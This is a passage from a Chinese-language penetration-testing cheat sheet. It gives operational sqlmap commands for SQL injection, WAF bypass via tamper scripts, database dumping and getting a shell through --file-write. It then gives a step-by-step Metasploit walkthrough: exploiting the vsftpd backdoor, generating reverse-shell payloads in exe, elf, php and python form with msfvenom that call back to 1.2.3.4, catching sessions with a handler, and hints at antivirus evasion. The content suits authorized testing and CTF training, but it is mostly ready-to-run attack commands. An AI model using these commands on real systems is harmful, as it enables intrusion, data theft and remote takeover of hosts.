操作：检测不到注入、过 WAF、控速时按需加参数。

```bash
sqlmap -u "http://target.com/item.php?id=1" --level 3 --risk 2 --threads 5 --batch
sqlmap -u "http://target.com/item.php?id=1" --cookie "session=xxx" \
  --proxy "http://127.0.0.1:8080" --tamper=space2comment --batch
sqlmap -u "http://target.com/item.php?id=1" -p id --dbms=mysql --time-sec 5 --batch
```

| 参数 | 作用 |
|---|---|
| -u / -r | URL 目标 / 请求文件目标 |
| --batch | 全部默认选项，非交互 |
| --dbs / -D / -T / -C | 库/表/列层级枚举 |
| --dump | 导出数据 |
| --os-shell | 数据库命令执行（需高权限加 FILE） |
| --level / --risk | 测试深度与风险等级（越高越慢越全） |
| --threads | 并发线程 |
| --tamper | 绕过 WAF 的变形脚本 |
| --time-sec | 时间盲注延迟秒数 |
| -p | 指定要测的参数名 |

预期结果：`--level 3 --risk 2` 会把测试扩展到更多注入点与更野的 payload；`--tamper=space2comment` 把空格替换成注释绕过简单 WAF。

如果不行：`--level 3` 会把测试时间放大很多倍，先 `--dbs` 小范围验证；tamper 生效但绕过失败就换别的脚本（列表用 `sqlmap --list-tampers` 查看）。

> [!tip] 授权渗透用 --batch 避免交互卡死；--os-shell 失败先查 --is-dba 与 secure_file_priv。

> [!warn] --dump 大数据量非常慢且流量特征明显，先 --count 评估数据量再决定是否全量导出。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| no parameter(s) found | 注入点级别低或参数没测 | 加 --level 3 --risk 2，-p 指定参数 |
| 检测超时/连接失败 | 目标慢或请求被拦 | 加 --timeout 与 --retries，或 --proxy 走代理 |
| 登录态丢失 | 未带 Cookie | 用 -r 请求文件或加 --cookie |
| --os-shell 失败 | 无 DBA / FILE 权限 | 查 --is-dba、secure_file_priv，改 --file-write 传 shell |
| --dump 极慢 | 数据量大或时间盲注 | 先 --count 估量，只 -C 选关键字段 |
| WAF 拦截 | 请求特征被识别 | --tamper 换脚本、--random-agent、限速 --delay |
| Unknown parameter | URL 带了特殊符号 | URL 整体用双引号包住，& 等符号不被 shell 拆解 |

#### 实战要点
- 标准流程一条龙：`--dbs -> -D --tables -> -T --columns -> --dump`，层级别跳。
- 自动检测不到就 `--level 3 --risk 2`，再手动 `-p` 指定参数。
- `--batch` 非交互必备，否则跑一半卡在提问上。
- getshell 路径：`--is-dba` 确认权限 -> `--file-write` 传 shell，优先于 `--os-shell`。
- 拿到的数据（尤其密码哈希）交 hashcat 破解是常见组合拳。

### [metasploit] Metasploit 流程与 msfvenom | medium | metasploit;msfvenom;payload | msf;msfconsole
> Metasploit 集成漏洞利用、后渗透与 payload 生成，流程固定：搜索、选用、配置、执行。

#### 这个条目的作用
Metasploit（MSF）是一套漏洞利用框架：内置上千个漏洞利用模块（exploit）、payload 生成器（msfvenom）和会话管理（meterpreter 后渗透）。打靶机/复现 CVE 的标准姿势就是：进 msfconsole -> 搜模块 -> 配置参数 -> 执行拿 shell。

#### 前置条件
- 装有 Metasploit：`apt install metasploit-framework` 或 Kali 自带；`msfconsole --version` 验证
- 已经过信息收集：目标 IP、开放端口、服务版本
- 已确认目标上的服务存在对应漏洞（用 nmap 指纹配合搜模块）

#### 第 1 步：进入 msfconsole 并搜索模块
操作：启动控制台，用 `search` 按关键字、类型、平台过滤找模块。

```bash
msfconsole
search vsftpd                          # 按软件名搜
search type:exploit platform:linux     # 按类型+平台过滤：linux 的 exploit
search cve:2017                     # 按 CVE 编号搜
```

预期结果：打印模块列表，每行有模块路径（如 `exploit/unix/ftp/vsftpd_234_backdoor`）、评分、披露日期等。

如果不行：`search` 无结果显示数据库没初始化或关键字不对，先 `search type:exploit` 看能不能列出东西；模块名记不全时用关键字部分匹配。

#### 第 2 步：使用模块并查看信息
操作：`use` 选中模块，`info` 看漏洞描述与适用版本，`show options` 看必填参数。

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
info
show options
```

预期结果：`info` 给出该漏洞详情与受影响版本；`show options` 列出参数表，`Required` 列为 yes 的是必填，`Current Setting` 列显示当前值。

如果不行：`use` 报找不到模块先核对路径是否完整；`show options` 为空说明没正确 use。

#### 第 3 步：配置目标参数
操作：用 `set` 填必填参数（RHOSTS 目标、RPORT 端口等）。

```bash
set RHOSTS 192.168.1.10
set RPORT 21
show options
```

预期结果：`show options` 里 RHOSTS 从空变为 `192.168.1.10`；RPORT 变成 21。

如果不行：参数名大小写敏感（`set rhosts` 会报无效参数），对照 `show options` 里的列名原样填写；RHOSTS 是复数写法（可填网段/文件），单目标也用它。

#### 第 4 步：配置 payload 与回连参数
操作：`set PAYLOAD` 选反弹 shell 类型，`set LHOST`（你的 IP，payload 回连到谁）、`set LPORT`。

```bash
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST 192.168.1.100        # 攻击机 IP，必要时先 ip addr 确认
set LPORT 4444
```

预期结果：`show options` 出现 PAYLOAD/LHOST/LPORT 且已填值；`LHOST` 是必填，不填执行必失败。

如果不行：反弹 shell 的 LHOST 必须是目标能连回你的地址——靶场 NAT 环境填内网 IP，公网目标要填公网 IP 或做好端口映射；先 `ip addr` 确认攻击机 IP 再填。

#### 第 5 步：执行并管理会话
操作：`run`（或 `exploit`）触发利用，成功后进入会话。

```bash
run
sessions -l          # 列出所有会话
sessions -i 1        # 进入第 1 个会话
background           # 把当前会话挂后台返回 msf 提示符
```

预期结果：`run` 后目标反弹连接，打印 `Meterpreter session 1 opened` 或 `Command shell session 1 opened`；在会话里能执行命令。

如果不行：`run` 后卡住/超时，先确认 LHOST/LPORT 填对、目标端口真开放、payload 类型与目标系统架构匹配（x86 打 x64 会段错误）；利用失败改看 `info` 里漏洞对应服务版本是否真的命中。

#### 第 6 步：msfvenom 生成自定义 payload
操作：`msfvenom` 单独生成 payload 文件：`-p` payload、`LHOST/LPORT`、`-f` 输出格式、`-o` 输出文件。

```bash
# Windows exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o shell.exe
# Linux elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -o shell
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f raw -o shell.php
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -o shell.py
```

预期结果：生成的文件存在，`file shell.exe` 显示对应格式（PE32 executable 等）；大小在几 KB 到几十 KB。

如果不行：`--list payloads` 可看全部 payload 名单；格式参数写错（`-f exe` 用于 exe，`-f raw` 用于脚本类）会报错，按表里对照。

#### 第 7 步：起监听接收反弹 shell
操作：payload 传出去之前先在本机起 handler 监听，保证回连有地方接。

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```

预期结果：`run` 后进入等待状态（`Started reverse TCP handler`），目标执行 payload 后打印会话建立提示。

如果不行：监听 payload 必须与传给目标的 payload 完全一致（名字、LHOST、LPORT 至少端口一致），不一致接不到；防火墙挡了端口就 `netstat -tlnp` 排查，或换端口。

> [!tip] 反弹后先 getuid、sysinfo、shell 进交互式命令；meterpreter 会话比普通 shell 功能全。

> [!warn] msfvenom 默认 payload 基本被杀软查杀，免杀需配合编码或分离加载，生产环境慎用。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| exploit 失败/超时 | 目标是 x64 用了 x86 payload、端口不对、模块版本不符 | 核对架构与端口，重选 payload/模块 |
| 反弹 shell 收不到 | LHOST/LPORT 填错、防火墙拦截 | 确认攻击机 IP、端口放行，监听与 payload 一致 |
| sessions 列表为空 | 没有成功建立会话 | 回到 run 排查利用是否真的成功 |
| msfvenom 报错 Unknown payload | payload 名字拼错 | `msfvenom --list payloads` 查准确名字 |
| 生成的 shell 被杀软报毒 | 裸 payload 特征明显 | CTF/授权环境优先用 `linux/x64/shell_reverse_tcp` 或加密编码，实战需免杀方案 |
| database not initialized | 未初始化 msf 数据库 | `msfdb init` 后重启 msfconsole |

#### 实战要点
- 固定流程四步走：`search -> use -> set 参数 -> run`，先 `show options` 看必填项。
- 反弹型 payload 三件套必填：PAYLOAD、LHOST、LPORT，缺一个必失败，LHOST 先用 `ip addr` 确认。
- 靶机 Linux 就用 `linux/x64/shell_reverse_tcp`（x64）或 `linux/x86`，别拿 Windows payload 硬套。
- 监听与 payload 全程保持端口一致；meterpreter 里 `getuid`/`sysinfo` 先摸底。
- msfvenom 生成的文件目标机器码要匹配架构（x64 目标用 x64 payload），格式按表选。